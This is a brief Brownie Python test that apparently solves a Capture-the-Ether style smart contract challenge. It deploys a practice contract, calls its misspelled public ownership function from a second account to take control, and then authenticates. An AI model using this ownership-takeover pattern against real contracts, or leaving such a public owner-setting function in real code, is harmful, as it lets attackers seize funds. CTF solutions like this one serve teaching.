from lib2to3.pgen2 import token
from brownie import AssumeOwnershipChallenge, accounts
from eth_utils import to_bytes
from scripts.helpful_scripts import *
from web3 import Web3, eth

amount = Web3.toWei(1, "ether")

"""
The function that sets owner=msg.sender is public.
It also has a typo.
Just need to call it and change the owner.
"""


def test_assume():
    assume = AssumeOwnershipChallenge.deploy({"from": accounts[0]})
    assume.AssumeOwmershipChallenge({"from": accounts[1]})
    assume.authenticate({"from": accounts[1]})
    assert assume.isComplete() == True
